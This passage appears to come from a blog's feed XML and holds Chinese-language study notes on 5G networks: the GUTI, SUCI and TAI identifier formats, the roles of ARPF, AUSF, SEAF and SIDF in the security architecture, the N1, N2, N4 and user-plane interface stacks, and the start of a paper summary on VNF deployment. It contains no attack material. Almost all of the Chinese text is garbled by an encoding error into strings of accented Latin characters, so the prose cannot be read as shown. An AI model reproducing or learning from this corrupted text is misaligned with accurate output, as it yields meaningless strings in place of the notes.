å…¨çƒè‡¨æ™‚çµ±ä¸€æ¨™ç¤ºç¬¦(5G-GUTI)</h3><p>5G-GUTIæ˜¯ä¸€å€‹éæ°¸ä¹…æ¨™èªŒï¼Œç”±AMFç‚ºUEè‡¨æ™‚åˆ†é…(æ–¼<strong>è¨»å†Šæµç¨‹</strong>æ™‚åˆ†é…)çš„ï¼Œç”¨æ–¼æ¨™ç¤ºè©²UE<br>ä½¿ç”¨ä¸åŒå­˜å–æ–¹å¼(3GPP,non-3GPP)ï¼Œä½¿ç”¨ç›¸åŒçš„5G-GUTI</p><ul><li><p>5G-GUTIçš„çµæ§‹:</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;5G-GUTI&gt;:=&lt;GUAMI&gt;&lt;5G-TMSI&gt; (:= ç‚º &quot; å®šç¾©ç‚º &quot; çš„ç¬¦è™Ÿ)</span><br><span class="line">&lt;GUAMI&gt;:ç”¨æ–¼æ¨™ç¤ºä¸€å€‹æˆ–å¤šå€‹AMF</span><br><span class="line">&lt;5G-TMSI&gt;:ç”¨æ–¼è­˜åˆ¥å”¯ä¸€çš„UE</span><br></pre></td></tr></table></figure></li><li><p>GUAMIçš„çµæ§‹:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;GUAMI&gt;:= &lt;MCC&gt;&lt;MNC&gt;&lt;AMF Region ID&gt;&lt;AMF Set ID&gt;&lt;AMF Pointer&gt;</span><br><span class="line"></span><br><span class="line">&lt;AMF Region ID&gt;: ç”¨æ–¼æ¨™ç¤ºå€åŸŸ</span><br><span class="line">&lt;AMF Set ID&gt;: åœ¨AMFå€åŸŸä¸­å”¯ä¸€æ¨™ç¤ºä¸€çµ„AMF</span><br><span class="line">&lt;AMF Pointer&gt;: åœ¨AMFçµ„ä¸­å”¯ä¸€æ¨™ç¤ºä¸€å€‹AMF </span><br></pre></td></tr></table></figure></li><li><p>5G-S-TMSIæ˜¯GUTIçš„ç¸®çŸ­å½¢å¼ï¼Œç”¨æ–¼ç„¡ç·šsignalling(å°‹å‘¼æˆ–æ¥­å‹™è«‹æ±‚æµç¨‹)æå‡å‚³è¼¸æ•ˆç‡</p></li><li><p>5G-S-IMSI-çµæ§‹:</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;5G-S-TMSI&gt;:= &lt;AMF Set ID&gt;&lt;AMF Pointer&gt;&lt;5G-TMSI&gt;</span><br></pre></td></tr></table></figure></li><li><p>5G-TMSIçš„10ä½æœ€ä½æœ‰æ•ˆä½å…ƒè¢«NG-RANç”¨ä¾†æ±ºå®šUEçš„å‘¼å«æ™‚æ©Ÿ</p><ul><li>æ‰€ä»¥è©²10ä½æœ€ä½æœ‰æ•ˆä½å…ƒæ‡‰å¹³å‡åˆ†å¸ƒï¼Œä½¿ä¸åŒUEçš„å°‹å‘¼æ™‚æ©Ÿå‡å‹»åˆ†å¸ƒ</li></ul></li></ul><table><thead><tr><th>MCC</th><th>MNC</th><th>AMF Region ID</th><th>AMF Set ID</th><th>AMF Pointer</th><th>5G-TMSI</th></tr></thead><tbody><tr><td>12bit</td><td>8&#x2F;12bit</td><td>16bit</td><td>4bit</td><td>4bit</td><td>32bit</td></tr><tr><td>PLMN</td><td>PLMN</td><td>AMF ID</td><td>AMF ID</td><td>AMF ID</td><td></td></tr><tr><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td>GUAMI</td><td></td></tr><tr><td></td><td></td><td></td><td>5G-S-TMSI</td><td>5G-S-TMSI</td><td>5G-S-TMSI</td></tr><tr><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td><td><strong>5G-GUTI</strong></td></tr></tbody></table><h3 id="SUCI"><a href="#SUCI" class="headerlink" title="SUCI"></a>SUCI</h3><p>SUCIæ˜¯éæ°¸ä¹…æ€§æ¨™èªŒï¼ŒåŸºæ–¼ SUPI(Subscription Permanent Identifier) åŠ å¯†å½¢å¼æ§‹æˆç”¨æ–¼ä¿è­·éš±ç§çš„æ¨™èªŒ<br>ç”±æ–¼æ¯å€‹ç°½ç´„ç”¨æˆ¶çš„SUPIæ˜¯æ°¸ä¹…ä¸”å”¯ä¸€çš„ï¼Œç›´æ¥å‚³è¼¸æœƒæœ‰éš±ç§é¢¨éšª</p><p>UE(USIMæˆ–ME)å¯ä»¥æ ¹æ“š<strong>ECIES</strong>,ç”šè‡³æ˜¯<strong>Null-Scheme</strong>ç”ŸæˆSUCI<br>ç•¶AMFæ”¶åˆ°SUCIå¾Œï¼Œè§¸ç™¼æˆæ¬Š(Authentication)æµç¨‹ï¼Œä¹‹å¾Œåœ¨UDM&#x2F;SIDFä¸­ä½¿ç”¨è§£å¯†æ¼”ç®—æ³•(SIDF)å°‡æ”¶åˆ°çš„SUCIè§£ç¢¼æˆSUPIï¼Œä»¥åˆ©å®Œæˆå¾ŒçºŒæˆæ¬Šå·¥ä½œ</p><h3 id="TAI-amp-TAC"><a href="#TAI-amp-TAC" class="headerlink" title="TAI&amp;TAC"></a>TAI&amp;TAC</h3><p>çš†ç‚ºä½ç½®æ€§æ¨™èªŒ<br>TAI: è·Ÿè¹¤å€æ¨™èªŒ<br>TAC: è·Ÿè¹¤å€ç·¨ç¢¼</p><ul><li>æ ¼å¼:<table><thead><tr><th>MCC</th><th>MNC</th><th>TAC</th></tr></thead><tbody><tr><td>12bit</td><td>8&#x2F;12bit</td><td>20bit</td></tr><tr><td>PLMN ID</td><td>PLMN ID</td><td>TAC</td></tr><tr><td><strong>TAI</strong></td><td><strong>TAI</strong></td><td><strong>TAI</strong></td></tr></tbody></table></li></ul><h2 id="å®‰å…¨æ¶æ§‹èˆ‡æµç¨‹"><a href="#å®‰å…¨æ¶æ§‹èˆ‡æµç¨‹" class="headerlink" title="å®‰å…¨æ¶æ§‹èˆ‡æµç¨‹"></a>å®‰å…¨æ¶æ§‹èˆ‡æµç¨‹</h2><p>UEåœ¨RANæˆ–åœ¨ä¸åŒç¶²è·¯é–“ç§»å‹•æ™‚ï¼Œéœ€è¦èˆ‡ç¶²è·¯é€²è¡Œç›¸äº’èªè­‰ï¼Œç¢ºä¿é›™æ–¹æ˜¯å¯ä¿¡è³´çš„<br>UEèˆ‡ç¶²è·¯ä¹‹é–“çš„ç›¸äº’èªè­‰éœ€è¦<strong>5Gå®‰å…¨æ¶æ§‹</strong>çš„æ”¯æ´<br>5Gå®‰å…¨æ¶æ§‹æ‡‰åŒ…å«:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- ç·©è§£å’Œé™ä½æ”»æ“Š</span><br><span class="line">- æ”¯æ´é©—è­‰å’Œæˆæ¬Šæ©Ÿåˆ¶</span><br><span class="line">- æ”¯æŒå¯†é‘°ç›¸é—œåŠŸèƒ½</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/mY2DamY.png"></p><h2 id="å®‰å…¨æ¶æ§‹ç‰¹é»"><a href="#å®‰å…¨æ¶æ§‹ç‰¹é»" class="headerlink" title="å®‰å…¨æ¶æ§‹ç‰¹é»"></a>å®‰å…¨æ¶æ§‹ç‰¹é»</h2><ul><li>èˆ‡å­˜å–æ–¹å¼(3GPPã€non3GPP)ç„¡é—œçš„å®‰å…¨æ¶æ§‹ï¼Œä½¿ç”¨çµ±ä¸€çš„é©—è­‰æ–¹æ³•èˆ‡å¯†é‘°æ¶æ§‹</li><li>å¢å¼·å®‰å…¨(4G â†’ IMSI â†’ ä¸å®‰å…¨ | 5G â†’ SUCI&#x2F;SUPI â†’ å®‰å…¨)</li><li>å·®ç•°åŒ–èªè­‰: 5Gæ”¯æ´USIM,æ†‘è­‰,å¸³å¯†ç­‰å¤šç¨®èªè­‰æ–¹å¼</li><li>æœå‹™åŒ–æ¶æ§‹å’Œé–‹æ”¾ä»‹é¢å®‰å…¨</li></ul><p>å®‰å…¨æ¶æ§‹æ‰€æ¶‰åŠçš„NFï¼ŒåŒ…å«: ARPF,AUSF,SEAF,SIDF</p><ul><li>ARPF:<ul><li>èˆ‡UDMä¸€èµ·éƒ¨å±¬</li><li>è² è²¬å„²å­˜æ ¹å¯†é‘° $Ki$ å’Œç›¸é—œçš„ç°½ç´„è³‡æ–™</li><li>è¨ˆç®—5Gæˆæ¬Šå‘é‡</li></ul></li><li>AUSF:<ul><li>æä¾›<strong>EAPèªè­‰ä¼ºæœå™¨</strong>çš„åŠŸèƒ½ï¼Œé€²è¡ŒEAPèªè­‰ä»¥æ¨å°å‡º<strong>éŒ¨é»å¯†é‘°</strong></li></ul></li><li>SEAF:<ul><li>èˆ‡AMFä¸€èµ·éƒ¨å±¬</li><li>è² è²¬æ ¹æ“šéŒ¨é»å¯†é‘°ä¾†æ¨å°å‡ºä¸‹å±¤çš„NASèˆ‡ASå¯†é‘°ï¼Œ5G AKA å®Œæˆæˆæ¬Šçµæœæ¯”è¼ƒåŠŸèƒ½</li></ul></li><li>SIDF:<ul><li>èˆ‡UDMä¸€èµ·éƒ¨å±¬</li><li>è² è²¬å°‡SUCIè§£ç¢¼æˆSUPI</li></ul></li></ul><h2 id="å®‰å…¨æµç¨‹"><a href="#å®‰å…¨æµç¨‹" class="headerlink" title="å®‰å…¨æµç¨‹"></a>å®‰å…¨æµç¨‹</h2><p><img src="https://i.imgur.com/GuQNm2p.png"></p><ul><li>ç”±UEç™¼èµ·Requestï¼Œç™¼é€SUCIæˆ–5G-GUTIè¨Šæ¯çµ¦SEAF</li><li>SEAFå°‡SUCIæˆ–SUPI(è‹¥5G-GUTIæœ‰æ•ˆ)ç™¼é€çµ¦ä¾†æºç¶²è·¯(æ­¸å±¬åœ°ç¶²è·¯)çš„AUSF</li><li>AUSFé€²è¡Œèªè­‰å®Œå¾Œï¼Œå°‡è¨Šæ¯ç™¼é€çµ¦ä¾†æºç¶²è·¯çš„ UDM</li><li>UDMæ”¶åˆ°SUCIï¼Œå°‡å…¶è§£ç¢¼ç‚ºSUPIï¼Œä¸¦é€šéç”¨æˆ¶è³‡æ–™ï¼Œé¸æ“‡ç›¸æ‡‰çš„èªè­‰æ¼”ç®—æ³•ï¼Œé€éå¾ŒçºŒæµç¨‹å®Œæˆèº«åˆ†èªè­‰</li></ul><p>ç›®å‰5Gæ”¯æ´çš„èªè­‰æ¼”ç®—æ³•: <strong>EAP-AKAâ€™</strong> å’Œ <strong>5G AKA</strong> -3GPP TS 33.501</p><h2 id="åƒè€ƒè³‡æ–™"><a href="#åƒè€ƒè³‡æ–™" class="headerlink" title="åƒè€ƒè³‡æ–™"></a>åƒè€ƒè³‡æ–™</h2><p><a href="https://cat.chriz.hk/2019/12/5g-security-architecture.html">https://cat.chriz.hk/2019/12/5g-security-architecture.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ§ªç­†è¨˜- 5G ç¶²è·¯åŠŸèƒ½ä»‹é¢èˆ‡å”å®šå †ç–Š</title>
      <link href="/posts/3d68fc76.html"/>
      <url>/posts/3d68fc76.html</url>
      
        <content type="html"><![CDATA[<h2 id="N2ä»‹é¢-æ§åˆ¶ä»‹é¢èˆ‡å”å®šå †ç–Š"><a href="#N2ä»‹é¢-æ§åˆ¶ä»‹é¢èˆ‡å”å®šå †ç–Š" class="headerlink" title="N2ä»‹é¢(æ§åˆ¶ä»‹é¢èˆ‡å”å®šå †ç–Š)"></a>N2ä»‹é¢(æ§åˆ¶ä»‹é¢èˆ‡å”å®šå †ç–Š)</h2><p>$5G Access,Network \stackrel{N2}{\longleftrightarrow} 5GC(AMF)$</p><ul><li><strong>ç®¡ç†æµç¨‹:</strong> ä¸èˆ‡ç‰¹å®šUEç›¸é—œï¼Œåƒæ˜¯è¨­å®šæˆ–é‡ç½®N2ä»‹é¢</li><li><strong>èˆ‡å–®ä¸€UEç›¸é—œçš„æµç¨‹:</strong> NASå‚³è¼¸æµç¨‹ã€UEä¸Šä¸‹æ–‡ç®¡ç†ã€PDU sessionè³‡æºç›¸é—œæµç¨‹ã€åˆ‡æ›ç®¡ç†..etc</li><li>æ¡ç”¨ <strong>NG-APå”å®š</strong> (ä¸è«–æ˜¯å“ªç¨®Access Network: 3GPP RAN æˆ– N3IWF non-3GPP )ï¼Œå±¬æ–¼ä¸€ç¨®æ‡‰ç”¨å±¤å”å®š</li><li>AMFå°æ–¼ä¸€å€‹UEæœ‰å”¯ä¸€çš„N2 çµ‚çµé»</li><li>ç”±æ–¼SMFèˆ‡AMFæ˜¯è§£è€¦çš„ï¼Œæ‰€ä»¥NG-APæ”¯æ´AMFåœ¨5G RANèˆ‡5GCä¹‹é–“å‚³é<strong>N2 SMè¨Šæ¯</strong></li></ul><p><img src="https://i.imgur.com/TP3cmJb.png"></p><ul><li>SCTPä¿è­‰Acces Networkèˆ‡5GCä¹‹é–“çš„å‚³è¼¸</li></ul><h2 id="UEèˆ‡5GCä¹‹é–“çš„æ§åˆ¶é¢ä»‹é¢èˆ‡å”å®šå †ç–Š"><a href="#UEèˆ‡5GCä¹‹é–“çš„æ§åˆ¶é¢ä»‹é¢èˆ‡å”å®šå †ç–Š" class="headerlink" title="UEèˆ‡5GCä¹‹é–“çš„æ§åˆ¶é¢ä»‹é¢èˆ‡å”å®šå †ç–Š"></a>UEèˆ‡5GCä¹‹é–“çš„æ§åˆ¶é¢ä»‹é¢èˆ‡å”å®šå †ç–Š</h2><p>é‡å°æ¯ç¨®UEä½¿ç”¨çš„é€£æ¥æ–¹å¼(3GPPã€non-3GPP)ï¼ŒUEçš†æœƒæœ‰ä¸€å€‹ <strong>N1 NASé€£æ¥</strong>ï¼Œä¸”æœƒæœ‰å”¯ä¸€çš„N1çµ‚çµé»ç‚ºä½æ–¼AMFã€‚</p><blockquote><p><strong>éæ¥å…¥å±¤(NAS, Non-access stratum)</strong><br>åŸå…ˆå­˜åœ¨æ–¼ 3G&#x2F;UMTSä¸­çš„å”å®šå±¤ï¼Œæ˜¯ç”¨æˆ¶è¨­å‚™èˆ‡æ ¸ç¶²ä¹‹é–“çš„åŠŸèƒ½å±¤<br>å…·å‚™ä»¥ä¸‹åŠŸèƒ½:</p><blockquote><p>ç§»å‹•æ€§ç®¡ç†<br>å‘¼å«æ§åˆ¶<br>æœƒè©±ç®¡ç†<br>èº«åˆ†ç®¡ç†<br><a href="https://hackmd.io/M4SyLAOpRam7lZVLuujOHw">NAS åƒè€ƒè³‡æ–™</a></p></blockquote></blockquote><p>N1 NASå¯ç”¨æ–¼:</p><ul><li><strong>UEè¨»å†Šç®¡ç†</strong></li><li><strong>é€£æ¥ç®¡ç†</strong></li><li><strong>æœƒè©±ç®¡ç†</strong></li></ul><p>N1ä»‹é¢ä¹‹ä¸­çš„NASå”è­°åˆ†æˆ: NAS-MMã€NAS-SM</p><h2 id="NAS-MM"><a href="#NAS-MM" class="headerlink" title="NAS-MM"></a>NAS-MM</h2><p>ç”¨æ–¼UEèˆ‡AMFä»¥å¤–çš„NFé€²è¡Œäº’å‹•</p><ul><li>æœƒè©±ç®¡ç†æ¶ˆæ¯</li><li>UE ç­–ç•¥</li><li>ä½ç½®æœå‹™</li></ul><p><em>NASå‚³è¼¸æœƒè©±ç®¡ç†è¨Šæ¯ã€çŸ­è¨Šã€UEç­–ç•¥ã€ä½ç½®æœå‹™ç­‰å”è­°æµç¨‹</em><br><img src="https://i.imgur.com/iPUTyxa.gif"></p><h3 id="ç‰¹é»"><a href="#ç‰¹é»" class="headerlink" title="ç‰¹é»"></a>ç‰¹é»</h3><p>è™•ç†UEèˆ‡AMFä¹‹é–“çš„NASæµç¨‹ï¼ŒåŒ…å«:</p><ul><li>è™•ç†UEçš„è¨»å†Šç®¡ç†(RM)å’Œé€£æ¥ç®¡ç†(CM): åœ¨UEèˆ‡AMFä¹‹é–“æä¾›å®‰å…¨çš„è¨Šæ¯é€£çµ ã€å­˜å–æ§åˆ¶</li><li>é©ç”¨æ–¼å…¶ä»–é¡å‹çš„NASè¨Šæ¯(NAS-SMã€SMSç­‰)ï¼Œå¯èˆ‡RM&#x2F;CM NAS è¨Šæ¯åŒæ™‚å‚³è¼¸</li><li>é‡å°ä¸åŒå­˜å–æ–¹å¼(3GPP, non-3GPP)ä¹Ÿéƒ½æ¡ç”¨ç›¸åŒçš„NASå”å®š</li><li>UEé‡å°ä¸åŒç¨®å­˜å–æ–¹å¼éƒ½æœƒæœ‰ä¸€å€‹N1 NASé€£æ¥</li></ul><p><img src="https://i.imgur.com/sdjzoKJ.gif"></p><h2 id="NAS-SM"><a href="#NAS-SM" class="headerlink" title="NAS-SM"></a>NAS-SM</h2><p>æ”¯æ´è™•ç†UEèˆ‡SMFä¹‹é–“çš„<strong>æœƒè©±ç®¡ç†</strong></p><ul><li>PDUæœƒè©±ç”¨æˆ¶é¢çš„å»ºç«‹ã€ä¿®æ”¹ã€é‡‹æ”¾</li><li>SMè¨Šæ¯çš„å»ºç«‹ã€è™•ç†éƒ½æ˜¯åœ¨NAS-SMä¹‹ä¸­å®Œæˆçš„ï¼ˆå…§å®¹ä¸æœƒè¢«AMFè§£æï¼‰</li><li>NAS-MMå±¤æœƒè² è²¬UE-AMFä¹‹é–“SMè¨Šæ¯çš„æ”¶ç™¼ï¼Œä¸¦æä¾›å®‰å…¨ä¿è­·(<strong>ä¿è­·è¨Šæ¯çš„å®Œæ•´æ€§</strong>)</li></ul><p><img src="https://i.imgur.com/qLGM1Hk.gif"></p><h2 id="5GC-NFä¹‹é–“çš„æ§åˆ¶é¢ä»‹é¢èˆ‡å”å®šå †ç–Š"><a href="#5GC-NFä¹‹é–“çš„æ§åˆ¶é¢ä»‹é¢èˆ‡å”å®šå †ç–Š" class="headerlink" title="5GC NFä¹‹é–“çš„æ§åˆ¶é¢ä»‹é¢èˆ‡å”å®šå †ç–Š"></a>5GC NFä¹‹é–“çš„æ§åˆ¶é¢ä»‹é¢èˆ‡å”å®šå †ç–Š</h2><p>5G æ ¸ç¶²ä¸­çš„NFï¼Œ<strong>NF Service Producer</strong> æœƒé€éæœå‹™åŒ–ç•Œé¢ç‚º <strong>NF Service Consumer</strong> æä¾›æœå‹™</p><p>5Gæ ¸ç¶²ä¸­å°‡ä»¥ä¸‹æ§åˆ¶ä»‹é¢å®šç¾©ç‚ºæœå‹™åŒ–ç•Œé¢:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- Nsmf</span><br><span class="line">- Nudm</span><br><span class="line">- Nnrf</span><br><span class="line">- Nnssf</span><br><span class="line">- Nausf</span><br><span class="line">- Nnef</span><br><span class="line">- Nsmsf</span><br><span class="line">- Nudr</span><br><span class="line">- Npcf</span><br><span class="line">- N5g-eir</span><br><span class="line">- Nlmf</span><br></pre></td></tr></table></figure><p>é€™äº›æœå‹™åŒ–ä»‹é¢ä»¥<strong>HTTP 2.0</strong>èˆ‡<strong>JSON</strong>ä½œç‚ºæ‡‰ç”¨å±¤å”å®šï¼›3GPPæ‰€æœ‰ç¶²è·¯åŠŸèƒ½éƒ½å¿…é ˆæ”¯æŒ<strong>TLS</strong><br>è‹¥PLMNæ²’æœ‰æä¾›å…¶ä»–ç¶²è·¯å®‰å…¨æ–¹æ¡ˆï¼Œå‰‡TLSå°±å¿…é ˆè¢«ä½¿ç”¨<br>è€Œæœªä¾†å¯èƒ½æœƒä»¥ <strong><a href="https://zh.wikipedia.org/wiki/QUIC">QUIC&#x2F;UDP</a></strong> ä½œç‚ºå„ªåŒ–çš„æ–¹æ¡ˆ</p><p><img src="https://i.imgur.com/QWxhGJN.png"></p><h2 id="N4ä»‹é¢èˆ‡å”å®šå †ç–Š"><a href="#N4ä»‹é¢èˆ‡å”å®šå †ç–Š" class="headerlink" title="N4ä»‹é¢èˆ‡å”å®šå †ç–Š"></a>N4ä»‹é¢èˆ‡å”å®šå †ç–Š</h2><p>$SMF\stackrel{N4}{\longleftrightarrow}UPF$</p><p>N4ä»‹æ–¼SMFèˆ‡UPFä¹‹é–“ï¼Œå…·å‚™æ§åˆ¶é¢èˆ‡ç”¨æˆ¶é¢åŠŸèƒ½<br>N4å®šç¾©äº†ä»¥ä¸‹æµç¨‹:</p><p><em>æ§åˆ¶é¢æµç¨‹</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- N4æœƒè©±ç®¡ç†:</span><br><span class="line">ç”¨æ–¼SMFå»ºç«‹ã€æ›´æ–°ã€åˆªé™¤UPFä¸Šçš„N4æœƒè©±ä¸Šä¸‹æ–‡(Session Context)</span><br><span class="line">- N4å ±å‘Šæµç¨‹:</span><br><span class="line">ç”¨æ–¼UPFå‘SMFäº‹ä»¶(EX.æµé‡ä½¿ç”¨æƒ…æ³)</span><br><span class="line">- N4ç¯€é»ç´šåˆ¥æµç¨‹:</span><br><span class="line">SMFã€UPFä¹‹é–“N4ç¯€é»çš„å»ºç«‹ã€æ›´æ–°ã€é€£çµã€é‡‹æ”¾ï¼›UPFæœƒå‘SMFå ±å‘ŠN4ç¯€é»ç´šåˆ¥çš„äº‹ä»¶</span><br><span class="line">- SMFæš«åœè¨ˆè²»æµç¨‹:</span><br></pre></td></tr></table></figure><p><em>ç”¨æˆ¶é¢æµç¨‹</em><br>åœ¨SMFã€UPFä¹‹é–“è½‰ç™¼æµé‡:<br>ç•¶ç”¨æˆ¶è™•æ–¼<strong>CM-IDLE</strong>ç‹€æ…‹æ™‚ï¼ŒUPFå¯è½‰ç™¼downlink è³‡æ–™çµ¦SMFï¼ŒSMFå†æ±ºå®šå‘¼å«ç­–ç•¥</p><table><thead><tr><th>PFCP</th><th>$\longleftrightarrow$</th><th>PFCP</th></tr></thead><tbody><tr><td>UDF</td><td>$\longleftrightarrow$</td><td>UPF</td></tr><tr><td>IP</td><td>$\longleftrightarrow$</td><td>IP</td></tr><tr><td>L2</td><td>$\longleftrightarrow$</td><td>L2</td></tr><tr><td>L1</td><td>$\longleftrightarrow$</td><td>L1</td></tr><tr><td>Control Plane $\longleftrightarrow$ User Plane</td><td></td><td></td></tr></tbody></table><h2 id="ç”¨æˆ¶é¢ä»‹é¢èˆ‡å…¶å”å®šå †ç–Š"><a href="#ç”¨æˆ¶é¢ä»‹é¢èˆ‡å…¶å”å®šå †ç–Š" class="headerlink" title="ç”¨æˆ¶é¢ä»‹é¢èˆ‡å…¶å”å®šå †ç–Š"></a>ç”¨æˆ¶é¢ä»‹é¢èˆ‡å…¶å”å®šå †ç–Š</h2><p>$Access,Network\stackrel{N3}{\longleftrightarrow}UPF$<br>$UPF \stackrel{N9}{\longleftrightarrow}UPF$<br>N3èˆ‡N9ä»‹é¢åˆ†åˆ¥åœ¨5G RAN èˆ‡ UPFä¹‹é–“ ä»¥åŠUPFèˆ‡UPFä¹‹é–“å‚³éæ•¸æ“š</p><p><img src="https://i.imgur.com/p8GoGVl.gif"></p><ul><li><strong><a href="https://zh.wikipedia.org/wiki/%E5%8D%8F%E8%AE%AE%E6%95%B0%E6%8D%AE%E5%8D%95%E5%85%83">PDU(Protcol Data Unit) å±¤</a></strong>: è² è²¬åœ¨UEèˆ‡Data Networkä¹‹é–“çš„PDU Sessionå‚³éPDU</li></ul>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNF Deployment and Flow Scheduling in Geo-distributed Data Centers</title>
      <link href="/posts/85fe9be3.html"/>
      <url>/posts/85fe9be3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>NFVå¯é™ä½ç¶²è·¯ç‡Ÿé‹ä¸Šçš„è¨­å‚™æ¡è³¼ä»¥åŠç¶­è­·æˆæœ¬ï¼Œé€éNFVå¯å°‡ç¶²è·¯åŠŸèƒ½èˆ‡ç‰©ç†åŸºç¤è¨­æ–½é€²è¡Œè§£è€¦åˆã€‚<br>ä¸¦åœ¨é€šç”¨ç¡¬é«”ä¸Šé‹è¡Œè™›æ“¬ç¶²è·¯åŠŸèƒ½(VNF)ï¼ŒNFVå¯ä½¿ç¶²è·¯æ›´åŠ éˆæ´»å¯æ§ï¼Œä½†ä»ç„¶å­˜åœ¨å„ç¨®æŠ€è¡“æŒ‘æˆ°<br>åƒæ˜¯å¦‚ä½•åœ¨ä¸åŒåœ°ç†ä½ç½®ä¸Šæœ‰æ•ˆéƒ¨å±¬VNFsï¼Œä»¥åŠåœ¨ä¸åŒåœ°ç†ä½å€çš„è³‡æ–™ä¸­å¿ƒèª¿åº¦ç¶²è·¯æµé‡ã€‚</p><p>æœ¬ç¯‡è«–æ–‡ä¸­ç ”ç©¶æ­¤è­°é¡Œä¸¦æœ€å¤§ç¸£å‹•æ¸›å°‘éƒ¨å±¬ä»¥åŠé€šè¨Šæˆæœ¬ï¼Œæ­¤å•é¡Œè¢«è½‰æ›æˆ æ··åˆæ•´æ•¸ç·šæ€§è¦åŠƒå•é¡Œ(mixed-integer linear programming)ï¼Œæœ¬è«–æ–‡æå‡ºä¸€ç¨®åŸºæ–¼æ”¾é¬†çš„æ¼”ç®—æ³•(relaxtion-based algorithm)ä¾†è§£æ±ºå®ƒçš„è¨ˆç®—è¤‡é›œåº¦ï¼Œæœ€å¾Œé€šéå¯¦é©—çµæœè¡¨æ˜ï¼Œè©²æ¼”ç®—æ³•å¯æœ‰æ•ˆé™ä½éƒ¨å±¬èˆ‡é€šè¨Šæˆæœ¬ã€‚</p><h2 id="Ch1-Introduction"><a href="#Ch1-Introduction" class="headerlink" title="Ch1-Introduction"></a>Ch1-Introduction</h2><p>å‚³çµ±è³‡æ–™ä¸­å¿ƒæˆ–é›²ç«¯é‹ç®—ç¶²è·¯æ¶æ§‹ä»°è³´ç‰¹å®šç¡¬é«”ä¾†æä¾›ç‰¹å®šç¶²è·¯æœå‹™ï¼Œåƒæ˜¯é˜²ç«ç‰†ã€å…¥ä¾µåµæ¸¬ç³»çµ±ã€‚<br>é€™äº›é€ æˆç¡¬é«”æˆæœ¬éé«˜ã€‚è€ŒNFVçš„å‡ºç¾å–ä»£äº†é€™ç¨®å¾€è³´ç‰¹å®šç¡¬é«”çš„ç¶²è·¯æ¶æ§‹ã€‚</p><p>è—‰ç”±NFVï¼Œç¶²è·¯åŠŸèƒ½å¯èƒ½è¢«è™›æ“¬åŒ–æˆåŸºæ–¼è»Ÿé«”çš„VNFä¸¦é‹è¡Œåœ¨ä¸€èˆ¬COTSæœå™¨ä¸Šã€‚<br><img src="https://i.imgur.com/9GcTBYs.png"></p><p>è€Œç‚ºäº†æä¾›ç¶²è·¯æœå‹™ï¼Œç¶²è·¯æµéœ€è¦æµç¶“éä¸€é€£ä¸²ä»¥æ’åºä¹‹ç¶²è·¯åŠŸèƒ½çš„é›†åˆ<br><img src="https://i.imgur.com/fBK2DgN.png"></p><p>ç„¶è€Œè¦å¯¦éš›æ‡‰ç”¨NFVæŠ€è¡“ï¼Œå¿…é ˆè€ƒé‡åˆ°VNFè¦å¦‚ä½•ä¸²æ¥æˆä¸€ä¸²æœå‹™éˆ(service chains)ä»¥é™ä½æˆæœ¬<br>ä»¥å¾€é€™éƒ¨åˆ†çš„ç 